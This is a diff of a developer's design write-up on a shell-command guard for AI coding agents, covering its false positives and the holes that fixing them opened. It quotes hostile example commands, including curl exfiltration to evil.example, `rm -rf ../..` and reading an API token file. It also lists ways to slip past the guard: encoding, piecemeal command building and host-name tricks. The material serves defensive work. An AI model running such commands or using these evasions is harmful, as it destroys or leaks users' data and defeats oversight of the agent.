@@ -51,80 +51,90 @@ this one can't be talked out of a block. If a command is legitimately blocked, a
 person runs it outside the agent. An override the agent controls is an override a
 poisoned instruction controls.
 
-The honest limit, stated plainly: this is porous against deliberate obfuscation
-(`base64`, `eval`, hiding a path in a variable). It stops honest mistakes and obvious
-attacks cheaply. The real wall for a determined adversary is an OS-level sandbox; this
-rides in front of one, not instead of it.
+The honest limit, stated plainly: anyone deliberately trying to get around this will.
+Encode the command, build it out of pieces at the last second, hide the filename in a
+variable, and it goes straight past, because all this does is read the command as text.
+It stops honest mistakes and obvious attacks cheaply. The real wall for someone who
+means it is an operating system sandbox. This runs in front of one, not instead of one.
 
 ## 4. Fixing the false positives opened three new holes
 
-A second review put about sixty commands through the guard that the suite never tested.
-The verdict was that the architecture held and the pattern matching was where the work
-was, which turned out to be exactly right, and not in the way I expected.
+Someone ran about sixty commands through the guard that its tests never covered. Their
+verdict was that the design was sound and the rules were where the work was. That turned
+out to be right, and not in the way I expected.
 
-The guard blocked `cat docs/design-tokens.md`. Design tokens are a universal frontend
-convention, so anyone doing interface work hits that within an hour, and a guard that
-blocks a designer's own file every morning gets uninstalled by lunch. It also blocked
-`curl --help`, `grep -rn curl scripts/`, and a local-to-local `rsync`, none of which
-touch a network. Meanwhile `rm -rf ../..` sailed straight through, and that is the
-likeliest real havoc there is, because an agent runs with its working directory inside
-your repo and needs no absolute path to destroy it.
+It was blocking things people do constantly. `cat docs/design-tokens.md` was refused,
+and design tokens are something almost every front-end project has, so anyone doing
+interface work would hit it within an hour. A guard that stops you reading your own file
+every morning is one you uninstall by lunch. It also refused `curl --help`, a search for
+the word `curl` in a folder, and a copy from one place on my own disk to another. None of
+those touch a network.
 
-Fixing all of that took three changes: a benign tier underneath the credential words,
-command-position matching for the network binaries, and resolving relative paths in the
-destruction lock. Every one of those fixes was correct. Three of them also opened a new
-hole, and the suite went green over all three.
+Meanwhile `rm -rf ../..` went straight through. That one matters most, because an agent
+runs inside your project folder, so it never needs a full path to destroy your work.
 
-The local-destination allow-list had already been anchored to the parsed URL host
-rather than the whole command, which was the fix for an earlier incident where
-`curl -A localhost https://evil.example` passed because a user-agent string satisfied a
-check about where data goes. The host test itself was still a substring match, so
-`localhost.evil.example` passed too. The same bug, one layer down, and the change that
-finally made `.local` hosts work was the change that removed the last anchoring. The
-list is now exact for the literals and dot-bounded for the suffixes.
+Fixing all that took three changes: letting the secret-file rule stand down when the file
+is obviously source code, only treating a network command as a network command when it is
+the command being run, and working out what a path like `../..` actually points at. Each
+of those was right. Three of them also opened a new hole, and the tests passed over every
+one.
 
-Splitting a command into segments on braces shattered a JSON request body and left the
-URL in a segment with no command in front of it, so `curl -d '{"tok":"..."}' https://x`
-had nothing to judge, while the same request written with an explicit `-X POST` blocked.
-Braces never needed splitting. A `{ cmd; }` group always carries a separator that splits
-already.
+The first was the same bug I had already fixed once. The list of allowed destinations was
+being checked against the address in the URL rather than the whole command, which was the
+fix for `curl -A localhost https://evil.example` sneaking past. But it was still asking
+whether the address *contained* something local, so `localhost.evil.example` passed too.
+Same mistake, one level down. The change that finally made real local addresses work was
+the change that removed the last of the strictness. Now an address either is one of the
+allowed names exactly, or ends with one.
 
-The benign tier yielded on `.txt`, `.sh` and `.sql` anywhere, which are precisely the
-shapes a naive credential file takes, so the new version was weaker than the old one on
-`cat ~/api_token.txt`. Those extensions now yield only under a repo-relative source
-directory, because `app/` and `src/` also appear inside paths like `/opt/app/`.
+The second came from splitting a command into pieces so each part could be judged
+separately. It split on curly braces, which broke apart the data attached to a web
+request and left the address sitting in a piece with no command in front of it. So
+`curl -d '{"tok":"..."}' https://x` had nothing to judge, while the same request written
+slightly differently was blocked. Braces never needed splitting.
 
-The lesson is about sequence rather than regex. The tests were written after the code,
-so they could only encode the blind spots already known, and a suite can be green over
-a hole its author never thought to look for. The sixty-command corpus that found these
-is now part of the suite, and it goes first next time.
+The third made the new version weaker than the old one. Letting the secret-file rule stand
+down for source code also let it stand down for `.txt`, `.sh` and `.sql` files anywhere on
+the disk, and those are exactly what someone names a file when they save a password into
+one. Now those only get the benefit of the doubt inside the project you are working in,
+because a folder called `app` also turns up in paths like `/opt/app/`.
+
+The real lesson is about order, not about any of the rules. The tests were written after
+the code, so they could only cover the mistakes I already knew I might make. A test suite
+can be entirely green over a hole its author never thought to look for. The sixty commands
+that found these problems are part of the suite now, and next time they go first.
 
 ## 5. Writing about a dangerous command is not running one
 
-The network binaries were anchored to command position early, because `grep -rn curl
-scripts/` has to stay open. The destruction checks never got the same treatment, and it
-showed the moment the guard was pointed at its own development: a commit message reading
-`anchor mkfs to command position` was refused by the mkfs rule, and a heredoc that merely
-mentioned a command was refused too. During one session this guard blocked four of the
-commands being used to improve it, including the commit that fixed the false positive it
-was firing on.
+Network commands only count when they are the command being run. That went in early,
+because searching a folder for the word `curl` has to keep working. The destructive
+commands never got the same treatment, and it showed as soon as I pointed the guard at
+its own development. A commit message describing this very fix was refused, because it
+contained the name of a disk-formatting command. So was a block of text I was saving to
+a file that happened to mention one.
 
-That is not a cosmetic problem. A control that stops you describing a danger teaches you
-to route around the control, and the routing becomes habit long before the next real
-catch. So `mkfs`, `dd`, `diskutil`, `chmod` and `git` are now resolved in command
-position through the same launcher-stripping path the network binaries use, which also
-means a dangerous binary hiding behind `sudo` or `xargs` is still caught.
+Over a single session this guard blocked four of the commands I was using to improve it,
+including the commit that fixed the false alarm it was firing on.
 
-Anchoring to command position turned out to be necessary and not sufficient. `git commit
--m "block git clean -xfd"` has `git` in command position, so it still matched the clean
-rule on the message text. For a multiplexer like git the real unit is the SUBCOMMAND, and
-finding it means stripping git's own global options first so that `git -C path push
---force` still resolves to push. The general form of the lesson: anchoring is only as
-good as your model of where the command actually begins, and for any tool that dispatches
-to subcommands, the binary name is one level too shallow.
+That is not a cosmetic annoyance. A rule that stops you writing about a danger teaches
+you to work around the rule, and working around it becomes a habit long before the next
+real catch arrives. So the destructive commands are now recognised the same way network
+ones are, which also means one hiding behind `sudo` still gets caught.
 
-One case is deliberately left open. A heredoc body line that begins with a dangerous word
-is indistinguishable from a command without parsing heredocs, and the guard reads a
-command string rather than a shell syntax tree. Skipping heredoc bodies wholesale would
-be wrong too, since `bash <<EOF` executes them. The README says so plainly, and
-`--explain` will name the lock and the operand so an over-block is easy to recognise.
+Doing that was necessary and not enough. `git commit -m "block git clean -xfd"` has
+`git` as the command being run, so it still matched the rule about `git clean`, on the
+strength of the message text. Git is really a hundred tools behind one name, so the part
+that matters is the word after it, and finding that word means stepping over git's own
+options first, so `git -C somewhere push --force` still comes out as a push.
+
+The general version: being strict about where a command starts is only as good as your
+idea of where it starts. For anything that hides many tools behind one name, the name is
+one level too shallow.
+
+One case is left open on purpose. If you save a block of text to a file and one of the
+lines begins with a dangerous word, that line is indistinguishable from a real command
+unless the guard understands shell syntax properly, and it reads the command as text.
+Ignoring saved text entirely would be wrong the other way, because you can feed a block
+of text straight into a shell and it will run. The README says so plainly, and asking
+`--explain` will name the rule that fired and the exact thing it objected to, so a false
+alarm is easy to recognise.
